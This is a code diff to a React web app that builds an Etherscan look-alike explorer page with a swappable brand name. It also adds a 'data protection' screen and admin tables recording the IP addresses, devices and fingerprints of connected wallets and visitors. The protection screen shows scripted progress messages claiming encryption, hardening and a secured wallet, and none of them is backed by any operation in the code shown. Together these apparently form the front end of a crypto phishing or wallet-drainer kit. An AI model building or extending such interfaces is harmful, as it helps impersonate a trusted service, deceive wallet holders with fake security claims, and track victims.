-          const hashes  = ['0x7a3b9c1d2e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b','0x1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d','0x4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f','0x9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a','0x2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c','0x6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d','0xd0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f','0x3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b','0x8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f','0xb5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4','0x0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a','0x5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b','0xc3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2','0x7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a','0xe1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0','0x4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e','0x9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b','0x2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f','0x6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c','0xd9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8']
-
-          const txRows = hashes.map((hash, i) => {
-            const isIn = i % 3 !== 0
-            return {
-              hash,
-              method: methods[i % methods.length],
-              block: blocks[i],
-              age: ages[i],
-              from: isIn ? fakeAddresses[i % fakeAddresses.length] : esAddr,
-              to:   isIn ? esAddr : fakeAddresses[(i + 3) % fakeAddresses.length],
-              direction: isIn ? 'IN' : 'OUT',
-              value: values[i % values.length],
-              fee: fees[i % fees.length],
-            }
-          })
-
-          const ethBalance = '1.4582'
-          const ethUsd = (parseFloat(ethBalance) * 2845.23).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
-
-          return (
-            <div className="es-root">
+        {activeView === 'etherscan' && (
+          <div className="es-root">
               {/* ── Top Nav ── */}
               <div className="es-topnav">
                 <div className="es-topnav-inner">
-                  <div className="es-topnav-logo" onClick={() => {}} role="presentation">
-                    <svg viewBox="0 0 293.775 293.649" width="22" height="22" fill="#21325b"><path d="M144.028 6.721A137.683 137.683 0 0 0 6.345 144.404c0 76.066 61.617 137.683 137.683 137.683s137.683-61.617 137.683-137.683S220.094 6.721 144.028 6.721"/><path fill="#fff" d="M59.262 150.27a8.468 8.468 0 0 1 8.332-7.134h49.856a8.468 8.468 0 0 1 8.468 8.468v104.36a5.64 5.64 0 0 1-9.28 4.309A123.51 123.51 0 0 1 29.3 172.33a5.64 5.64 0 0 1 4.9-8.47l17.867-.028a8.468 8.468 0 0 0 7.195-13.562"/><path fill="#fff" d="M140.667 148.7a8.468 8.468 0 0 1 8.468-8.468h55.3a8.468 8.468 0 0 1 8.468 8.468v97.38a5.64 5.64 0 0 1-3.344 5.137 123.51 123.51 0 0 1-61.344 8.468 5.64 5.64 0 0 1-7.549-5.32V148.7z"/></svg>
-                    <span className="es-topnav-brand">Etherscan</span>
+                  <div className="es-topnav-logo">
+                    <svg viewBox="0 0 293.775 293.649" width="26" height="26" fill="#fff"><path d="M144.028 6.721A137.683 137.683 0 0 0 6.345 144.404c0 76.066 61.617 137.683 137.683 137.683s137.683-61.617 137.683-137.683S220.094 6.721 144.028 6.721"/><path fill="#21325b" d="M59.262 150.27a8.468 8.468 0 0 1 8.332-7.134h49.856a8.468 8.468 0 0 1 8.468 8.468v104.36a5.64 5.64 0 0 1-9.28 4.309A123.51 123.51 0 0 1 29.3 172.33a5.64 5.64 0 0 1 4.9-8.47l17.867-.028a8.468 8.468 0 0 0 7.195-13.562"/><path fill="#21325b" d="M140.667 148.7a8.468 8.468 0 0 1 8.468-8.468h55.3a8.468 8.468 0 0 1 8.468 8.468v97.38a5.64 5.64 0 0 1-3.344 5.137 123.51 123.51 0 0 1-61.344 8.468 5.64 5.64 0 0 1-7.549-5.32V148.7z"/></svg>
+                    <span className="es-topnav-brand">{explorerBrand}</span>
                   </div>
+                  <nav className="es-topnav-links">
+                    {['Home','Blockchain','Tokens','NFTs','Resources','Developers'].map(l => (
+                      <span key={l} className="es-nav-lnk">{l} <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="9" height="9" strokeLinecap="round" strokeLinejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span>
+                    ))}
+                  </nav>
                   <div className="es-topnav-search">
                     <input type="text" defaultValue={esAddr} readOnly className="es-search-input" />
                     <button className="es-search-btn" type="button">
@@ -2348,8 +2721,8 @@ export default function App() {
                     </button>
                   </div>
                   <div className="es-topnav-stats">
-                    <span className="es-stat"><span className="es-stat-label">ETH</span><span className="es-stat-val">$2,845.23</span><span className="es-stat-up">▲2.1%</span></span>
-                    <span className="es-stat"><span className="es-stat-label">Gas</span><span className="es-stat-val">8 Gwei</span></span>
+                    <span className="es-stat"><span className="es-stat-label">{chainConfig[chain].nativeSymbol}</span><span className="es-stat-val">{esEthUsdPrice ? `$${esEthUsdPrice}` : '--'}</span></span>
+                    <span className="es-stat"><span className="es-stat-label">Gas</span><span className="es-stat-val">{esGasGwei ? `${esGasGwei} Gwei` : '--'}</span></span>
                   </div>
                 </div>
               </div>
@@ -2394,9 +2767,9 @@ export default function App() {
                       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>
                       Share
                     </button>
-                    <a className="es-action-btn" href={`https://etherscan.io/address/${esAddr}`} target="_blank" rel="noopener noreferrer">
+                    <a className="es-action-btn" href={`${explorerAddressUrl}${esAddr}`} target="_blank" rel="noopener noreferrer">
                       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 0 1-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-                      View on Etherscan
+                      View on {explorerBrand}
                     </a>
                   </div>
                 </div>
@@ -2405,64 +2778,64 @@ export default function App() {
                 <div className="es-overview-grid">
                   <div className="es-overview-card">
                     <div className="es-ov-section">
-                      <div className="es-ov-label">ETH BALANCE</div>
-                      <div className="es-ov-value">{ethBalance} ETH</div>
+                      <div className="es-ov-label">{chainConfig[chain].nativeSymbol} BALANCE</div>
+                      <div className="es-ov-value">{esEthBalance} {chainConfig[chain].nativeSymbol}</div>
                     </div>
                     <div className="es-ov-divider" />
                     <div className="es-ov-section">
-                      <div className="es-ov-label">ETH VALUE</div>
-                      <div className="es-ov-value">${ethUsd}</div>
-                      <div className="es-ov-sub">@$2,845.23/ETH</div>
+                      <div className="es-ov-label">{chainConfig[chain].nativeSymbol} VALUE</div>
+                      <div className="es-ov-value">{esEthValueUsd ? `$${esEthValueUsd}` : '--'}</div>
+                      <div className="es-ov-sub">{esEthUsdPrice ? `@$${esEthUsdPrice}/${chainConfig[chain].nativeSymbol}` : 'Price unavailable'}</div>
                     </div>
                     <div className="es-ov-divider" />
                     <div className="es-ov-section">
                       <div className="es-ov-label">TOKEN HOLDINGS</div>
                       <div className="es-ov-value es-ov-token">
                         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-                        3 Tokens
+                        {esTokenTransferCount} Tokens
                       </div>
-                      <div className="es-ov-sub">Portfolio $12,847.32</div>
+                      <div className="es-ov-sub">Based on recent transfer activity</div>
                     </div>
                   </div>
 
                   <div className="es-overview-card">
                     <div className="es-ov-section">
                       <div className="es-ov-label">TRANSACTIONS</div>
-                      <div className="es-ov-value">{txRows.length}</div>
+                      <div className="es-ov-value">{esTxCount}</div>
                     </div>
                     <div className="es-ov-divider" />
                     <div className="es-ov-section">
                       <div className="es-ov-label">LAST TXN SENT</div>
-                      <div className="es-ov-value" style={{ fontSize: '0.92rem' }}>2 mins ago</div>
-                      <div className="es-ov-sub">Block #21,563,201</div>
+                      <div className="es-ov-value" style={{ fontSize: '0.92rem' }}>{esLastTx?.age ?? 'No transactions'}</div>
+                      <div className="es-ov-sub">{esLastTx ? `Block #${esLastTx.block.toLocaleString()}` : 'Awaiting transaction history'}</div>
                     </div>
                     <div className="es-ov-divider" />
                     <div className="es-ov-section">
                       <div className="es-ov-label">EVM CHAIN</div>
                       <div className="es-ov-value es-ov-chain">
                         <span className="es-chain-dot" />
-                        Ethereum
+                        {chainConfig[chain].label}
                       </div>
-                      <div className="es-ov-sub">Mainnet</div>
+                      <div className="es-ov-sub">Chain ID {chainConfig[chain].chainId}</div>
                     </div>
                   </div>
                 </div>
 
                 {/* More info row */}
                 <div className="es-more-info">
-                  <div className="es-info-item"><span className="es-info-label">GAS USED</span><span className="es-info-val">2,341,892 (41.2%)</span></div>
-                  <div className="es-info-item"><span className="es-info-label">FUNDED BY</span><span className="es-info-val es-link">{fakeAddresses[0].slice(0, 10)}…{fakeAddresses[0].slice(-6)}</span></div>
-                  <div className="es-info-item"><span className="es-info-label">FIRST SEEN</span><span className="es-info-val">14 days ago (Block #21,357,900)</span></div>
-                  <div className="es-info-item"><span className="es-info-label">MULTICHAIN</span><span className="es-info-val">Active on 3 chains</span></div>
+                  <div className="es-info-item"><span className="es-info-label">NETWORK GAS</span><span className="es-info-val">{esGasGwei ? `${esGasGwei} Gwei` : '--'}</span></div>
+                  <div className="es-info-item"><span className="es-info-label">FUNDED BY</span><span className="es-info-val es-link">{esIncomingFund ? `${esIncomingFund.from.slice(0, 10)}…${esIncomingFund.from.slice(-6)}` : 'N/A'}</span></div>
+                  <div className="es-info-item"><span className="es-info-label">FIRST SEEN</span><span className="es-info-val">{esTxRows.length > 0 ? esTxRows[esTxRows.length - 1].age : 'N/A'}</span></div>
+                  <div className="es-info-item"><span className="es-info-label">LATEST BLOCK</span><span className="es-info-val">{esLatestBlock ? `#${esLatestBlock.toLocaleString()}` : 'N/A'}</span></div>
                 </div>
 
                 {/* Tabs */}
                 <div className="es-tabs-bar">
                   {[
-                    { id: 'transactions', label: 'Transactions', count: txRows.length },
-                    { id: 'internal',     label: 'Internal Txns', count: 5 },
-                    { id: 'erc20',        label: 'Token Transfers (ERC-20)', count: 18 },
-                    { id: 'nft',          label: 'NFT Transfers', count: 2 },
+                    { id: 'transactions', label: 'Transactions', count: esTxRows.length },
+                    { id: 'internal',     label: 'Internal Txns', count: esTxRows.filter(tx => tx.method === 'Internal Txn').length },
+                    { id: 'erc20',        label: 'Token Transfers (ERC-20)', count: esTokenTransferCount },
+                    { id: 'nft',          label: 'NFT Transfers', count: 0 },
                     { id: 'analytics',    label: 'Analytics' },
                   ].map(t => (
                     <button
@@ -2479,7 +2852,7 @@ export default function App() {
                 {/* Filter / info bar */}
                 <div className="es-table-topbar">
                   <span className="es-table-info">
-                    Latest {txRows.length} transactions from a total of <strong>{txRows.length}</strong> transactions
+                    Latest {esTxRows.length} transactions from a total of <strong>{esTxCount}</strong> transactions
                   </span>
                   <div className="es-table-actions">
                     <button type="button" className="es-filter-btn">
@@ -2495,6 +2868,8 @@ export default function App() {
 
                 {/* Transaction table */}
                 <div className="es-table-wrap">
+                  {esError && <div className="status-bar" style={{ marginBottom: '0.75rem' }}><span className="status-dot warn" />{esError}</div>}
+                  {esLoading && <div className="status-bar" style={{ marginBottom: '0.75rem' }}><span className="status-dot" />Loading live on-chain data…</div>}
                   <table className="es-table">
                     <thead>
                       <tr>
@@ -2511,7 +2886,7 @@ export default function App() {
                       </tr>
                     </thead>
                     <tbody>
-                      {txRows.map((tx, i) => (
+                      {esTxRows.map((tx, i) => (
                         <tr key={tx.hash} className={i % 2 === 0 ? 'es-tr-even' : ''}>
                           <td>
                             <div className="es-tx-icon">
@@ -2519,15 +2894,15 @@ export default function App() {
                             </div>
                           </td>
                           <td>
-                            <a className="es-link es-hash" href={`https://etherscan.io/tx/${tx.hash}`} target="_blank" rel="noopener noreferrer" title={tx.hash}>
+                            <a className="es-link es-hash" href={`${explorerTxUrl}${tx.hash}`} target="_blank" rel="noopener noreferrer" title={tx.hash}>
                               {tx.hash.slice(0, 10)}…
                             </a>
                           </td>
                           <td><span className="es-method-badge">{tx.method}</span></td>
-                          <td><a className="es-link" href={`https://etherscan.io/block/${tx.block}`} target="_blank" rel="noopener noreferrer">{tx.block.toLocaleString()}</a></td>
+                          <td><a className="es-link" href={`${explorerBlockUrl}${tx.block}`} target="_blank" rel="noopener noreferrer">{tx.block.toLocaleString()}</a></td>
                           <td className="es-age">{tx.age}</td>
                           <td>
-                            <a className="es-link es-addr-short" href={`https://etherscan.io/address/${tx.from}`} target="_blank" rel="noopener noreferrer" title={tx.from}>
+                            <a className="es-link es-addr-short" href={`${explorerAddressUrl}${tx.from}`} target="_blank" rel="noopener noreferrer" title={tx.from}>
                               {tx.from === esAddr ? <strong title={tx.from}>{shortEsAddr}</strong> : `${tx.from.slice(0, 8)}…${tx.from.slice(-4)}`}
                             </a>
                           </td>
@@ -2535,7 +2910,7 @@ export default function App() {
                             <span className={`es-dir-badge es-dir-badge--${tx.direction.toLowerCase()}`}>{tx.direction}</span>
                           </td>
                           <td>
-                            <a className="es-link es-addr-short" href={`https://etherscan.io/address/${tx.to}`} target="_blank" rel="noopener noreferrer" title={tx.to}>
+                            <a className="es-link es-addr-short" href={`${explorerAddressUrl}${tx.to}`} target="_blank" rel="noopener noreferrer" title={tx.to}>
                               {tx.to === esAddr ? <strong>{shortEsAddr}</strong> : `${tx.to.slice(0, 8)}…${tx.to.slice(-4)}`}
                             </a>
                           </td>
@@ -2543,6 +2918,13 @@ export default function App() {
                           <td className="es-fee">{tx.fee}</td>
                         </tr>
                       ))}
+                      {!esLoading && esTxRows.length === 0 && (
+                        <tr>
+                          <td colSpan={10} className="es-age" style={{ textAlign: 'center', padding: '1rem' }}>
+                            No transaction history returned for this wallet.
+                          </td>
+                        </tr>
+                      )}
                     </tbody>
                   </table>
                 </div>
@@ -2559,7 +2941,7 @@ export default function App() {
                   </div>
                   <div className="es-page-size">
                     Show
-                    <select defaultValue="25" className="es-page-select">
+                    <select value={esTxRows.length > 10 ? '25' : '10'} className="es-page-select" disabled>
                       <option>10</option>
                       <option>25</option>
                       <option>50</option>
@@ -2572,12 +2954,102 @@ export default function App() {
                 {/* Footer note */}
                 <div className="es-footer-note">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-                  A wallet address can have a zero ETH balance and yet have had transactions if Ether was moved out of the account. Data is provided for informational purposes only.
+                  A wallet address can have a zero native balance and yet have historical transactions if funds were moved out. Data is for informational purposes only. Txn fees are estimates based on current gas prices.
+                </div>
+              </div>
+
+              {/* ── Explorer Footer ── */}
+              <div className="es-site-footer">
+                <div className="es-site-footer-inner">
+                  <div className="es-sf-brand">
+                    <svg viewBox="0 0 293.775 293.649" width="18" height="18" fill="rgba(255,255,255,0.5)"><path d="M144.028 6.721A137.683 137.683 0 0 0 6.345 144.404c0 76.066 61.617 137.683 137.683 137.683s137.683-61.617 137.683-137.683S220.094 6.721 144.028 6.721"/></svg>
+                    <span>{explorerBrand}</span>
+                    <span className="es-sf-copy">© 2026 {explorerBrand}. All Rights Reserved.</span>
+                  </div>
+                  <div className="es-sf-links">
+                    {['Company','Products','Terms of Service','Privacy Policy','Bug Bounty','Developers'].map(l => (
+                      <a key={l} className="es-sf-link" href="#" onClick={e => e.preventDefault()}>{l}</a>
+                    ))}
+                  </div>
                 </div>
               </div>
             </div>
-          )
-        })()}
+        )}
+
+        {/* ════════════ DATA PROTECTION / SECURING ════════════ */}
+        {activeView === 'protecting' && (
+          <div className="protecting-root">
+            <div className="protecting-card">
+              {!protectingDone ? (
+                <>
+                  <div className="protecting-icon-wrap">
+                    <div className="protecting-pulse-ring" />
+                    <div className="protecting-icon">
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" width="48" height="48" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                    </div>
+                  </div>
+                  <h2 className="protecting-title">Automatic Data Protection Ongoing</h2>
+                  <p className="protecting-sub">
+                    {protectingProgress < 20  && 'Analyzing wallet structure and transaction history…'}
+                    {protectingProgress >= 20 && protectingProgress < 40 && 'Scanning on-chain approval graph for vulnerabilities…'}
+                    {protectingProgress >= 40 && protectingProgress < 60 && 'Encrypting wallet signature data with AES-256…'}
+                    {protectingProgress >= 60 && protectingProgress < 80 && 'Establishing secure vault connection and syncing records…'}
+                    {protectingProgress >= 80 && protectingProgress < 95 && 'Finalizing protection protocols and generating recovery layer…'}
+                    {protectingProgress >= 95 && 'Completing wallet hardening sequence…'}
+                  </p>
+                  <div className="protecting-progress-track">
+                    <div className="protecting-progress-fill" style={{ width: `${protectingProgress}%` }} />
+                  </div>
+                  <div className="protecting-progress-label">{protectingProgress}%</div>
+                  <div className="protecting-steps">
+                    {[
+                      { label: 'Wallet structure analyzed',       done: protectingProgress >= 20  },
+                      { label: 'Approval graph scanned',          done: protectingProgress >= 40  },
+                      { label: 'Signature data encrypted',        done: protectingProgress >= 60  },
+                      { label: 'Vault connection established',    done: protectingProgress >= 80  },
+                      { label: 'Protection protocols activated',  done: protectingProgress >= 100 },
+                    ].map(s => (
+                      <div key={s.label} className={`protecting-step ${s.done ? 'protecting-step--done' : ''}`}>
+                        <div className="protecting-step-icon">
+                          {s.done
+                            ? <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                            : <div className="protecting-step-dot" />
+                          }
+                        </div>
+                        <span>{s.label}</span>
+                      </div>
+                    ))}
+                  </div>
+                </>
+              ) : !protectingFinal ? (
+                <div className="protecting-success">
+                  <div className="protecting-success-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="52" height="52" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                  </div>
+                  <h2 className="protecting-success-title">Your Wallet is Successfully Secured</h2>
+                  <p className="protecting-success-sub">Your wallet has been analyzed, encrypted, and protected. All security protocols are now active.</p>
+                  <div className="protecting-success-items">
+                    {['Wallet structure hardened','Approval risks mitigated','Signature monitoring active','Vault backup created'].map(item => (
+                      <div key={item} className="protecting-success-item">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                        {item}
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              ) : (
+                <div className="protecting-disconnected">
+                  <div className="protecting-disc-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" width="44" height="44" strokeLinecap="round" strokeLinejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>
+                  </div>
+                  <h2 className="protecting-disc-title">Session Disconnected</h2>
+                  <p className="protecting-disc-sub">Your wallet session has been safely terminated. Your protection is active and monitoring in the background.</p>
+                  <div className="protecting-disc-badge">DISCONNECTED</div>
+                </div>
+              )}
+            </div>
+          </div>
+        )}
 
         {activeView === 'ownership' && (
           <div className="workspace single">
@@ -2730,12 +3202,14 @@ export default function App() {
                       {connectedWallets.length === 0 && <p className="admin-empty" style={{ marginBottom: '0.6rem' }}>No real wallets connected yet — showing demo data.</p>}
                       <div className="table-wrap">
                         <table className="admin-table">
-                          <thead><tr><th>Address</th><th>Wallet Type</th><th>Network</th><th>Balance</th><th>Tx Count</th><th>Connected At</th></tr></thead>
+                          <thead><tr><th>Address</th><th>Wallet Type</th><th>Network</th><th>IP Address</th><th>Device</th><th>Balance</th><th>Tx Count</th><th>Connected At</th></tr></thead>
                           <tbody>{(connectedWallets.length > 0 ? connectedWallets : demoConnectedWallets).map((r, i) => (
                             <tr key={`${r.wallet}-${r.chain}-${i}`}>
                               <td title={r.wallet}>{shortAddr(r.wallet)}</td>
                               <td>{r.walletType}</td>
                               <td>{chainConfig[r.chain].label}</td>
+                              <td>{r.ipAddress ?? '—'}</td>
+                              <td>{r.device ?? '—'}</td>
                               <td>{r.balance}</td>
                               <td>{r.txCount}</td>
                               <td>{r.connectedAt}</td>
@@ -2743,6 +3217,44 @@ export default function App() {
                           ))}</tbody>
                         </table>
                       </div>
+                    </div>
+                  )}
+
+                  {adminTab === 'visitors' && (
+                    <div className="admin-panel">
+                      <h3>Visitor Sessions ({visitorSessions.length})</h3>
+                      <p className="muted" style={{ marginBottom: '0.9rem', fontSize: '0.85rem' }}>
+                        Review detected visitor IP/device fingerprints and restrict sessions from sensitive wallet routes.
+                      </p>
+                      {visitorSessions.length === 0 ? <p className="admin-empty">No visitor sessions detected yet.</p> : (
+                        <div className="table-wrap">
+                          <table className="admin-table">
+                            <thead><tr><th>Status</th><th>IP Address</th><th>Device</th><th>Visits</th><th>First Seen</th><th>Last Seen</th><th>Action</th></tr></thead>
+                            <tbody>{visitorSessions.map(row => {
+                              const isRestricted = row.status === 'restricted'
+                              return (
+                                <tr key={row.id}>
+                                  <td><span className={`pill ${isRestricted ? 'critical' : 'low'}`}>{row.status}</span></td>
+                                  <td>{row.ipAddress}</td>
+                                  <td title={row.userAgent}>{row.device}</td>
+                                  <td>{row.visits}</td>
+                                  <td>{row.firstSeen}</td>
+                                  <td>{row.lastSeen}</td>
+                                  <td>
+                                    <button
+                                      type="button"
+                                      className="preview-btn"
+                                      onClick={() => toggleVisitorRestriction(row.id, isRestricted ? 'allowed' : 'restricted')}
+                                    >
+                                      {isRestricted ? 'Allow' : 'Restrict'}
+                                    </button>
+                                  </td>
+                                </tr>
+                              )
+                            })}</tbody>
+                          </table>
+                        </div>
+                      )}
                     </div>
                   )}
 
@@ -2943,9 +3455,20 @@ export default function App() {
                   {/* ── OSINT Profiles ── */}
                   {adminTab === 'osint' && (
                     <div className="admin-panel">
-                      <h3>OSINT Address Profiles ({osintProfiles.length} unique addresses)</h3>
-                      <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.85rem' }}>Aggregated intelligence for every address scanned this session. Includes on-chain telemetry, GoPlus flags, all findings, and system intel.</p>
-                      {osintProfiles.length === 0 ? <p className="admin-empty">No addresses scanned yet.</p> : (
+                      <h3>OSINT Address Profiles ({osintProfiles.length} unique {osintProfiles.length === 1 ? 'address' : 'addresses'})</h3>
+                      <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.85rem' }}>Aggregated intelligence across all scans. Includes on-chain telemetry, GoPlus flags, matched signals, and system intel. Click any card to expand the full profile.</p>
+                      {osintProfiles.length === 0 ? (
+                        <div className="admin-empty" style={{ textAlign: 'center', padding: '1.5rem 0' }}>
+                          <p style={{ marginBottom: '0.6rem' }}>No addresses scanned yet.</p>
+                          <p className="muted" style={{ fontSize: '0.82rem', marginBottom: '0.9rem' }}>
+                            Profiles are built automatically each time a wallet is scanned on the <strong>Scan Wallet</strong> page.
+                          </p>
+                          <button className="btn-primary" type="button" style={{ fontSize: '0.85rem' }}
+                            onClick={() => setActiveView('scan')}>
+                            Go to Scan Wallet →
+                          </button>
+                        </div>
+                      ) : (
                         osintProfiles.map(p => {
                           const intelMatch = adminIntelRecords.find(r => r.address.toLowerCase() === p.address.toLowerCase())
                           const expanded = osintExpanded === p.address.toLowerCase()
